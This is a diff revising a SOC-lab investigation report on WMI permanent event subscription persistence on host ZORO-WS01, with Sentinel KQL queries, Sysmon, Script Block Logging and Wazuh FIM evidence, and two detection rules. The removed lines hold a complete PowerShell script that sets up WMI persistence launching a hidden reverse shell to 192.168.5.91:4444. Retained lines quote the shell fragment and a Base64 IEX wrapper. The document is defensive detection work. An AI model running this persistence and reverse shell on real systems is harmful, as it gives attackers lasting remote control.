@@ -202,52 +202,24 @@ Event
 
 ![Figure 2 — Sentinel Process Creation Investigation](screenshots/05-sentinel-process-creation-investigation1.png)
 
-Two process creation events were relevant within the query window.
+Two process creation events were relevant.
 
-**WmiPrvSE.exe** was created at **17:12:36.024 IST**.
+| Process | Time (IST) | PID | Parent | User |
+|---|---|---|---|---|
+| `WmiPrvSE.exe` | 17:12:36.024 | 10144 | `svchost.exe` | SYSTEM |
+| `powershell.exe` | 17:12:36.120 | 5344 | `WmiPrvSE.exe` (PID 10144) | SYSTEM |
 
-| **Field**       | **Value**                                     |
-|-----------------|-----------------------------------------------|
-| Process ID      | 10144                                         |
-| Parent Process  | `C:\Windows\System32\svchost.exe`             |
-| Parent Command  | `svchost.exe -k DcomLaunch -p`                |
-| User            | `NT AUTHORITY\SYSTEM`                         |
-| Integrity Level | System                                        |
-| Command Line    | `wmiprvse.exe -Embedding`                     |
+The `WmiPrvSE.exe` process was created through the normal WMI infrastructure. However, it spawned a hidden PowerShell process approximately 96 milliseconds later.
 
-The creation of `WmiPrvSE.exe` through `svchost.exe` with the `-Embedding` flag is
-expected WMI infrastructure behavior — WMI instantiating a provider on demand. The
-significance came from what it created ninety-six milliseconds later.
+The PowerShell command line contained `-nop -w hidden -c` and referenced `System.Net.Sockets.TCPClient` with destination `192.168.5.91:4444`. Its parent ProcessGuid matched the WMI Provider Host process, confirming the parent-child relationship.
 
-**powershell.exe** was created at **17:12:36.120 IST**.
-
-| **Field**              | **Value**                                                              |
-|------------------------|------------------------------------------------------------------------|
-| Process ID             | 5344                                                                   |
-| ProcessGuid            | `{7e2edb0d-1a2c-6aeb-6403-000000002f00}`                               |
-| Parent Process         | `C:\Windows\System32\wbem\WmiPrvSE.exe`                                |
-| Parent Process ID      | 10144                                                                  |
-| Parent ProcessGuid     | `{7e2edb0d-1a2c-6aeb-6303-000000002f00}`                               |
-| User                   | `NT AUTHORITY\SYSTEM`                                                  |
-| Integrity Level        | System                                                                 |
-| Command Line (partial) | `powershell.exe -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('192.168.5.91',4444)...` *(truncated)* |
-
-The `-nop` flag prevents the user profile from loading, `-w hidden` runs the process with
-no visible window, and `-c` executes a supplied command string. The partial command line
-referenced `System.Net.Sockets.TCPClient` with destination `192.168.5.91:4444`. The
-command line was truncated at Sysmon's XML serialisation limit; the full payload was not
-visible here alone.
-
-The parent ProcessGuid in the second event matched the ProcessGuid recorded for
-`WmiPrvSE.exe` exactly, establishing that the same process instance created the
-PowerShell child. The destination IP `192.168.5.91` became the next investigative pivot.
+The destination IP became the next investigative pivot.
 
 ---
 
 ## 3. Network Connection Correlation
 
-The analyst searched Sysmon telemetry for all references to the destination address
-extracted from the PowerShell command line.
+The analyst then examined Sysmon telemetry for network activity involving the destination IP address identified in the previous investigation.
 
 ```kql
 Event
@@ -259,11 +231,6 @@ Event
 ```
 
 ![Figure 3 — Sentinel Network Connection Correlation](screenshots/06-sentinel-network-connection-correlation1.png)
-
-The query returned multiple records. Two categories were excluded from the attack
-investigation: earlier `PING.EXE` events run by the interactive `Zoro` user during
-pre-attack lab connectivity testing, and two UDP/137 System-process records representing
-unrelated NetBIOS Name Service traffic.
 
 The two records directly relevant to the attack were:
 
@@ -288,14 +255,8 @@ TCP connection to `192.168.5.91:4444` was initiated by the specific `powershell.
 instance created by `WmiPrvSE.exe` — not a coincidentally matching PID. The
 `Initiated: true` field confirmed that ZORO-WS01 originated the connection.
 
-A note on timestamps: the `TimeGenerated` values used throughout this investigation
-reflect Sentinel ingestion times. The underlying Sysmon `UtcTime` field within Event ID 3
-records the event slightly earlier than its `TimeGenerated`. The ProcessGuid correlation
-is therefore used as the primary process-identity evidence rather than relying exclusively
-on ingestion timestamp ordering.
-
-The BUGGY listener independently corroborated receipt of the inbound connection from
-`192.168.5.92`.
+The BUGGY listener also displayed the incoming connection from ZORO-WS01,
+independently corroborating that the connection reached the attacker-side listener.
 
 ![Figure 4 — BUGGY Listener Callback](screenshots/01-buggy-listener-callback.png)
 
@@ -335,11 +296,11 @@ The script block text recorded the in-session execution wrapper:
 IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...')))
 ```
 
-`FromBase64String` decoded the Base64 content into bytes. `Unicode.GetString` converted
-those bytes into a PowerShell string. `IEX` executed the result. Script Block Logging
-captured this event with the decoded content exposed — the log records what PowerShell
-actually executes, not what was submitted. The attacker's encoding was defeated at the
-logging layer.
+The analyst identified the use of Base64 encoding from the presence of
+`FromBase64String` in the recorded script. The wrapper decoded the encoded content
+into a PowerShell string and passed it for execution through `IEX`. PowerShell Script Block Logging captured the decoded script content in Event ID 4104.
+This allowed the analyst to examine the actual commands executed without manually
+decoding the Base64 content.
 
 This event occurred at 17:12:05 — **thirty seconds before** the WmiPrvSE process creation
 at 17:12:36. No new `powershell.exe` was created for this execution. The
@@ -350,65 +311,22 @@ precisely why Query 2 found no suspicious process creation at this time.
 
 **Event 2 — 17:12:05.732 IST**
 
-The decoded script block, recorded in full by the logging layer:
+The decoded script revealed that the attacker configured a WMI permanent event
+subscription using four WMI objects and two bindings.
 
-```powershell
-$reverseShell = 'powershell.exe -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient(''192.168.5.91'',4444);..."'
+- **WindowsUpdateExec:** A `CommandLineEventConsumer` configured to execute the
+  attacker's command when triggered.
+- **WindowsUpdateCheck_Boot:** An `__EventFilter` monitoring the creation of
+  `userinit.exe`, serving as a logon-related trigger.
+- **WindowsUpdateTimer_Once:** A one-shot timer configured to generate an event
+  approximately 30 seconds after creation.
+- **WindowsUpdateCheck_Timer:** An `__EventFilter` configured to detect the timer event.
+- **Two bindings:** Connected both event filters to the same consumer, allowing
+  either trigger to invoke the configured action.
 
-$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-    Name = "WindowsUpdateExec"
-    CommandLineTemplate = $reverseShell
-}
-
-$filterBoot = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-    Name = "WindowsUpdateCheck_Boot"
-    EventNamespace = "root\cimv2"
-    QueryLanguage = "WQL"
-    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'userinit.exe'"
-}
-
-$fireTime = (Get-Date).AddSeconds(30).ToUniversalTime().ToString("yyyyMMddHHmmss.ffffff+000")
-
-$timer = Set-WmiInstance -Namespace root\cimv2 -Class __AbsoluteTimerInstruction -Arguments @{
-    TimerId = "WindowsUpdateTimer_Once"
-    EventDateTime = $fireTime
-}
-
-$filterTimer = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-    Name = "WindowsUpdateCheck_Timer"
-    EventNamespace = "root\cimv2"
-    QueryLanguage = "WQL"
-    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'WindowsUpdateTimer_Once'"
-}
-
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-    Filter = $filterBoot; Consumer = $consumer
-}
-
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-    Filter = $filterTimer; Consumer = $consumer
-}
-```
-
-The script created **four WMI objects and two bindings**:
-
-- **`WindowsUpdateExec`** — a `CommandLineEventConsumer` configured to execute the reverse
-  shell when triggered.
-- **`WindowsUpdateCheck_Boot`** — an `__EventFilter` monitoring `userinit.exe` process
-  creation. This fires once per user logon after the WMI service has loaded — the
-  reboot-surviving persistence trigger.
-- **`WindowsUpdateTimer_Once`** — a one-shot `__AbsoluteTimerInstruction` created in
-  `root\cimv2`, configured to fire 30 seconds from creation.
-- **`WindowsUpdateCheck_Timer`** — an `__EventFilter` watching for the `__TimerEvent`
-  matching `WindowsUpdateTimer_Once` — the immediate verification trigger.
-- **Two `__FilterToConsumerBinding` objects** — connecting the boot filter to the consumer
-  and the timer filter to the consumer.
-
-The gap between this event (17:12:05.732) and the process creation observed in Query 2
-(17:12:36.120) is approximately **30.4 seconds** — consistent with the `AddSeconds(30)`
-timer configured in the payload.
-
-**Event 3 — 17:12:37.356 IST**
+The timer provided an immediate execution trigger, while the `userinit.exe` filter
+was intended to provide a logon-related trigger. Execution of the logon trigger
+following a reboot was not tested.
 
 A later script block referenced the same `System.Net.Sockets.TCPClient('192.168.5.91',4444)`
 code, consistent with the consumer's `CommandLineTemplate` executing when the timer fired.
@@ -442,6 +360,23 @@ Wazuh was configured to monitor `C:\Windows\System32\wbem\Repository` with
 objects are stored: `OBJECTS.DATA` holds the serialised WMI object data, while `INDEX.BTR`
 and the mapping files maintain the repository's internal structure.
 
+### 5.1 Wazuh Dashboard — FIM Alerts
+
+The Wazuh dashboard displayed six File Integrity Monitoring alerts for the WMI
+repository files. All six were Rule 550 alerts with severity level 7, associated
+with ZORO-WS01 (Agent 002).
+
+The alerts showed modifications to `OBJECTS.DATA`, `INDEX.BTR`, and the repository
+mapping files.
+
+![Figure 9 — Sentinel Wazuh FIM Alert Correlation](screenshots/09-sentinel-wazuh-fim-alert-correlation.png)
+
+### 5.2 Sentinel — Wazuh FIM Alert Correlation
+
+The same Wazuh FIM alerts were forwarded into Microsoft Sentinel through the custom
+ingestion pipeline. The following query was used to retrieve the alerts and correlate
+them with the investigation timeline.
+
 ```kql
 WazuhAlerts_CL
 | extend IST = datetime_utc_to_local(TimeGenerated, "Asia/Kolkata")
@@ -456,26 +391,25 @@ WazuhAlerts_CL
 ```
 
 ![Figure 8 — Wazuh WMI Repository FIM Alerts](screenshots/08-wazuh-wmi-repository-fim-alerts.png)
-![Figure 9 — Sentinel Wazuh FIM Alert Correlation](screenshots/09-sentinel-wazuh-fim-alert-correlation.png)
 
-Six Wazuh Rule 550 alerts — *Integrity checksum changed*, level 7 — were returned, all
-from ZORO-WS01 Agent 002.
+The query returned six Rule 550 alerts for ZORO-WS01, showing two groups of WMI
+repository file modifications.
 
 **First group — 17:12:26–17:12:27 IST**
 
-| **Time (IST)** | **File Modified**                                               |
-|----------------|------------------------------------------------------------------|
-| 17:12:26.981   | `c:\windows\system32\wbem\repository\objects.data`              |
-| 17:12:27.115   | `c:\windows\system32\wbem\repository\index.btr`                 |
-| 17:12:27.133   | `c:\windows\system32\wbem\repository\mapping3.map`              |
+| **Time (IST)** | **File Modified** |
+|---|---|
+| 17:12:26.981 | `c:\windows\system32\wbem\repository\objects.data` |
+| 17:12:27.115 | `c:\windows\system32\wbem\repository\index.btr` |
+| 17:12:27.133 | `c:\windows\system32\wbem\repository\mapping3.map` |
 
 **Second group — 17:12:56–17:12:57 IST**
 
-| **Time (IST)** | **File Modified**                                               |
-|----------------|------------------------------------------------------------------|
-| 17:12:56.709   | `c:\windows\system32\wbem\repository\objects.data`              |
-| 17:12:56.776   | `c:\windows\system32\wbem\repository\index.btr`                 |
-| 17:12:56.794   | `c:\windows\system32\wbem\repository\mapping1.map`              |
+| **Time (IST)** | **File Modified** |
+|---|---|
+| 17:12:56.709 | `c:\windows\system32\wbem\repository\objects.data` |
+| 17:12:56.776 | `c:\windows\system32\wbem\repository\index.btr` |
+| 17:12:56.794 | `c:\windows\system32\wbem\repository\mapping1.map` |
 
 Each alert included old and new MD5, SHA-1, and SHA-256 hashes. The first group occurred
 approximately 21 seconds after the WMI creation script executed (17:12:05.732). The
@@ -550,18 +484,11 @@ reboot-based execution was not demonstrated during this investigation.
 | 17:12:36.024   | `WmiPrvSE.exe` (PID 10144) instantiated by `svchost.exe`                          |
 | 17:12:36.120   | `WmiPrvSE.exe` spawns `powershell.exe` (PID 5344) with reverse shell command line |
 | 17:12:37.356   | 4104 records consumer's script block executing                                    |
-| 17:12:39.341   | Sysmon Event ID 3: TCP from `192.168.5.92:57055` to `192.168.5.91:4444` *(TimeGenerated — see note below)* |
+| 17:12:39.341   | Sysmon Event ID 3: TCP from `192.168.5.92:57055` to `192.168.5.91:4444`           |
 | 17:12:39       | BUGGY listener receives connection from ZORO-WS01                                 |
 | 17:12:56.709   | Wazuh FIM: `OBJECTS.DATA` modified (second flush)                                 |
 | 17:12:56.776   | Wazuh FIM: `INDEX.BTR` modified                                                   |
 | 17:12:56.794   | Wazuh FIM: `MAPPING1.MAP` modified                                                |
-
-> **Note on Event ID 3 timestamp:** The `TimeGenerated` value of 17:12:39.341 reflects
-> Sentinel's ingestion time for the network connection record. The underlying Sysmon
-> `UtcTime` within that event places the connection slightly earlier. The ProcessGuid
-> correlation across Event ID 1 and Event ID 3 — not the ingestion timestamp — is the
-> primary basis for attributing the network connection to the specific `powershell.exe`
-> instance spawned by `WmiPrvSE.exe`.
 
 The timeline demonstrates that WMI persistence was established thirty seconds before its
 effects appeared in process-creation telemetry.
@@ -573,15 +500,12 @@ effects appeared in process-creation telemetry.
 | **Question**                     | **Finding**                                                      |
 |----------------------------------|------------------------------------------------------------------|
 | Affected hosts                   | 1 — ZORO-WS01                                                    |
-| WMI permanent event subscription | Yes — confirmed by 4104 and WMI enumeration                      |
-| Reverse shell callback           | Yes — TCP to `192.168.5.91:4444`, corroborated by BUGGY listener |
-| Reboot-trigger validated         | Not demonstrated — objects confirmed, reboot not performed       |
+| Primary Activity         | PowerShell execution and WMI permanent event subscription activity       |
 | Lateral movement                 | Not observed                                                     |
 | Exfiltration                     | Not observed                                                     |
 
 The investigation remained confined to the single Windows endpoint involved in the
-controlled scenario. No lateral movement or data exfiltration were performed as part of
-Investigation 004.
+controlled scenario.
 
 ---
 
@@ -625,10 +549,9 @@ C:\Windows\System32\wbem\Repository\MAPPING3.MAP
 
 ### Persistence Artifacts
 
-No Run-key, Scheduled Task, or Service persistence artifacts were identified during the
-investigation. The investigation's documented telemetry scope does not establish the
-absence of all registry modifications, as Sysmon registry-event collection was not the
-focus of this investigation.
+No Run-key, Scheduled Task, or Service persistence artifacts were identified
+during the checks performed. The investigation primarily focused on WMI permanent
+event subscription activity.
 
 ---
 
@@ -834,7 +757,7 @@ before the first event returned by Rule A's validation.
 Rule A extracts the child and parent process filenames from each Sysmon Event ID 1 record
 and compares the parent against tiered lists of high-risk and medium-risk processes.
 
-**Parent tiers:**
+### Parent tiers
 
 | **Priority**              | **Category**        | **Example Processes**                                                           |
 |---------------------------|---------------------|---------------------------------------------------------------------------------|
@@ -848,7 +771,7 @@ and compares the parent against tiered lists of high-risk and medium-risk proces
 
 The command line is independently graded alongside the parent priority.
 
-**Command-line risk tiers:**
+### Command-line risk tiers 
 
 | **Tier**                           | **Indicators**                                                                                              |
 |------------------------------------|-------------------------------------------------------------------------------------------------------------|
@@ -857,34 +780,51 @@ The command line is independently graded alongside the parent priority.
 | Low — Stealth / Execution Flags    | `-ExecutionPolicy Bypass`, `-noprofile`, `-nop`, `-WindowStyle Hidden`, `-w hidden`                         |
 | Context — IP/URL                   | Raw IPv4 addresses, `http://`, `https://`                                                                   |
 
-The `Low — Stealth / Execution Flags` tier covers three distinct but related behaviors:
-`-ExecutionPolicy Bypass` circumvents PowerShell's execution policy; `-NoProfile`/`-nop`
-suppresses profile loading; `-WindowStyle Hidden`/`-w hidden` hides the execution window.
-In this investigation, the execution-stage PowerShell process was classified at this tier
-because the command line contained `-nop` and `-w hidden` — the encoding indicators that
-would have elevated the risk classification were in the in-session creation step, not in
-the consumer's child process.
+### Command-Line Risk Interpretation
 
-A High parent with any `CommandLineRisk` tier is an immediate investigation trigger. A
-Medium parent with no command-line indicators warrants review but is lower priority. The
-scheduled rule excludes `Unknown — Review Parent` to prevent noise from infrastructure
-processes — in this investigation, Azure Arc management components and Wazuh Agent health
-checks produced unknown parent relationships in hunting mode. These are excluded from
-scheduled alerting but visible when the query is run without the exclusion filter.
+The command-line indicators represent different behaviours. `-ExecutionPolicy Bypass`
+attempts to bypass PowerShell execution policy, `-nop` prevents profile loading,
+and `-w hidden` hides the execution window.
 
-Rule B anchors on PowerShell Event ID 4104 and requires the script block to contain
-`CommandLineEventConsumer` combined with either `__FilterToConsumerBinding` or
-`__EventFilter`. This combination is essentially absent from legitimate administrative
-PowerShell, giving the rule an extremely low expected false positive rate. The
-`WMIIndicators` field tags which WMI object classes were detected, allowing the analyst
-to quickly assess subscription completeness and whether obfuscation was used.
+In this investigation, the execution-stage PowerShell process was classified as
+`Low — Stealth / Execution Flags` because its command line contained `-nop` and
+`-w hidden`.
 
-The two rules are non-overlapping. Rule A fires when WMI persistence **executes** — it
-requires `WmiPrvSE.exe` to spawn a shell. Rule B fires when WMI persistence is
-**created** — it requires a 4104 record with WMI subscription content. A subscription
-created but never triggered would only be caught by Rule B at creation time. A
-subscription created before Rule B was deployed would only be caught by Rule A when it
-fires. Deploying both rules provides coverage at both observable stages of T1546.003.
+### Parent Priority and Scheduled Detection
+
+High-priority parent processes are treated as stronger investigation indicators,
+while browser-spawned shells receive Medium priority. The scheduled Rule A excludes
+unknown parent processes to reduce noise from unclassified activity.
+
+This creates a limitation: a new or renamed malicious executable launching a shell
+may also fall into the unknown-parent category and therefore be excluded from
+scheduled alerts.
+
+### Rule B — WMI Subscription Creation
+
+Rule B examines PowerShell Event ID 4104 and looks for `CommandLineEventConsumer`
+combined with either `__FilterToConsumerBinding` or `__EventFilter`.
+
+The `WMIIndicators` field highlights additional subscription-related objects and
+potential encoding or dynamic execution indicators. These patterns are suspicious,
+but legitimate administrative scripts may also create WMI subscriptions. The actual
+false-positive rate must be evaluated against normal administrative activity.
+
+### How Rule A and Rule B Complement Each Other
+
+The two rules detect different stages of activity:
+
+- **Rule A — Execution:** Detects suspicious shell processes launched by potentially
+  risky parent processes, including WMI Provider Host.
+- **Rule B — Creation:** Detects PowerShell script blocks containing WMI permanent
+  event subscription creation indicators.
+
+A WMI subscription may be created without immediately triggering a new process.
+Rule B can detect its creation, while Rule A can detect suspicious process execution
+if the subscription subsequently launches a shell.
+
+Together, they provide visibility into both the creation and execution stages of
+WMI-based persistence.
 
 ---
 
@@ -945,41 +885,25 @@ per event.
 
 The investigation confirmed that:
 
-- An attacker leveraged an **existing elevated PowerShell session** on ZORO-WS01 to create
-  a WMI permanent event subscription using a Base64-encoded in-session payload.
-- **Sysmon Event ID 1 produced no process-creation event** for the subscription-creation
-  commands, because they executed inside a session that was already running.
-- **PowerShell Script Block Logging (Event ID 4104)** recorded both the encoded wrapper
-  and the fully decoded WMI creation script in plaintext at 17:12:05 IST. The Base64
-  obfuscation was defeated at the logging layer — the analyst did not decode anything; the
-  log already contained the decoded content.
-- The script created **four WMI objects and two bindings**: a `CommandLineEventConsumer`
-  (`WindowsUpdateExec`), two `__EventFilter` objects (`WindowsUpdateCheck_Boot` and
-  `WindowsUpdateCheck_Timer`), one `__AbsoluteTimerInstruction` (`WindowsUpdateTimer_Once`),
-  and two `__FilterToConsumerBinding` instances.
-- The consumer was configured to execute `powershell.exe -nop -w hidden -c` with a
-  reverse shell to `192.168.5.91:4444` running as `NT AUTHORITY\SYSTEM`.
-- Approximately **30.4 seconds after creation**, `WmiPrvSE.exe` spawned `powershell.exe`
-  (PID 5344, Integrity: System) with the reverse shell command line.
-- **Sysmon Event ID 3** confirmed a TCP connection from `192.168.5.92:57055` to
-  `192.168.5.91:4444`. The **ProcessGuid matched exactly** across Event ID 1 and
-  Event ID 3, providing strong process-instance correlation.
-- The **BUGGY listener** independently corroborated receipt of the inbound connection.
-- **Wazuh FIM** detected modification of `OBJECTS.DATA`, `INDEX.BTR`, and `MAPPING*.MAP`
-  in two groups at 17:12:26–27 and 17:12:56–57 IST. Sysmon's configured telemetry did not
-  capture in-place modification of these existing repository files; Wazuh FIM was the
-  source that detected this state change.
-- **Direct WMI enumeration** confirmed all four created objects and both bindings before
-  cleanup.
-- **Cleanup successfully removed** all attacker-created WMI objects; only the legitimate
-  SCM Event Log subscription remained.
-- **Two detection rules** were produced and validated: Rule A detects persistence
-  execution via Sysmon Event ID 1; Rule B detects persistence creation via PowerShell
-  Event ID 4104. Neither is a subset of the other.
-- A successful **reboot-based execution** of the logon trigger was not demonstrated
-  during this investigation.
-- No lateral movement or data exfiltration was observed or performed.
-
+- An attacker used an existing elevated PowerShell session on ZORO-WS01 to create
+  a WMI permanent event subscription using a Base64-encoded script.
+- PowerShell Event ID 4104 recorded the encoded execution wrapper and the decoded
+  WMI creation script. No new PowerShell process was created for the
+  subscription-creation commands.
+- The script created four WMI objects and two bindings, configuring a command-line
+  consumer with a timer-based trigger and a logon-related trigger.
+- Approximately 30.4 seconds after the creation activity, `WmiPrvSE.exe` spawned
+  a hidden PowerShell process running as SYSTEM.
+- Sysmon Event ID 3 recorded a TCP connection from ZORO-WS01 (`192.168.5.92`)
+  to BUGGY (`192.168.5.91:4444`). The matching ProcessGuid linked the connection
+  to the PowerShell process, and the BUGGY listener displayed the incoming connection.
+- Wazuh FIM detected modifications to the WMI repository files. Direct WMI
+  enumeration confirmed the created objects and bindings before cleanup.
+- Cleanup removed the attacker-created WMI objects, leaving the legitimate
+  SCM Event Log subscription.
+- Two Microsoft Sentinel Scheduled Analytics Rules were created: Rule A for
+  suspicious parent-child process execution and Rule B for WMI subscription
+  creation through PowerShell Script Block Logging.
 ---
 
 ## Detection Gap & Recommendations
@@ -1027,24 +951,10 @@ process.
 
 ### 5. Unknown Parent Exclusion Creates a Scheduled Detection Gap
 
-The scheduled Rule A excludes parents classified as `Unknown — Review Parent` to control
-false positives from known infrastructure components such as Azure Arc and the Wazuh
-Agent. This design decision means a custom attacker binary not present in any of the
-tiered parent lists — such as a renamed or novel malicious executable — will not generate
-a scheduled alert when it spawns a shell. The hunting-mode version of the query, run
-without the `SpawnPriority != "Unknown — Review Parent"` filter, remains available for
-periodic proactive review. Over time, known-good infrastructure parents should be
-documented explicitly by their command-line patterns, so that the exclusion tier becomes
-progressively cleaner rather than relying on blanket parent-name omission.
 
-### 6. Known Investigation Infrastructure Noise
-
-The initial parent-child hunt returned Azure Arc management components and the Wazuh Agent
-as frequent spawners of PowerShell children. These appear in hunting mode as
-`Unknown — Review Parent` and are excluded from scheduled alerting. After establishing a
-baseline in a production environment, known-good infrastructure parents should be
-documented by their specific command-line patterns — not by removing the parent name from
-the detection, since the parent process is exactly what the rule is designed to surface.
+The scheduled Rule A excludes parents classified as `Unknown — Review Parent`
+to reduce false positives from unclassified processes. However, a new or renamed malicious executable launching a shell may also fall
+into this category and therefore be excluded from scheduled alerts.
 
 ---
 
@@ -1106,15 +1016,5 @@ Block Logging, and Wazuh FIM via a custom ingestion pipeline — produced the co
 picture of how the persistence was created, how it persisted on disk, and how it
 executed.
 
-Two detection rules were produced. Rule A detects suspicious shell spawning from high-risk
-parent processes, covering the WMI execution lineage alongside Office applications, PDF
-readers, script hosts, LOLBins, and browsers. Rule B detects WMI event subscription
-creation through PowerShell Script Block content, firing approximately thirty seconds
-before the first execution-stage event visible to Rule A in this investigation. Neither
-rule is a subset of the other — a design decision that emerged directly from the
-investigation's evidence. The detection gaps identified — Sysmon WMI events 19/20/21 not
-enabled, WMI-Activity Event 5861 not collected, Script Block Logging dependency in Rule B,
-and the unknown-parent exclusion in Rule A's scheduled mode — are documented as genuine
-limitations, consistent with the evidence discipline applied across all SOC-LAB
-investigations.
+Two Microsoft Sentinel Scheduled Analytics Rules were developed from the investigation: Rule A detects suspicious parent-child process execution, while Rule B identifies WMI permanent event subscription creation through PowerShell Script Block Logging. Together, they provide visibility into both the creation and execution stages of WMI-based persistence. The investigation also demonstrated the value of correlating Sysmon, PowerShell Script Block Logging, and Wazuh FIM telemetry to build a more complete picture of endpoint activity.
 
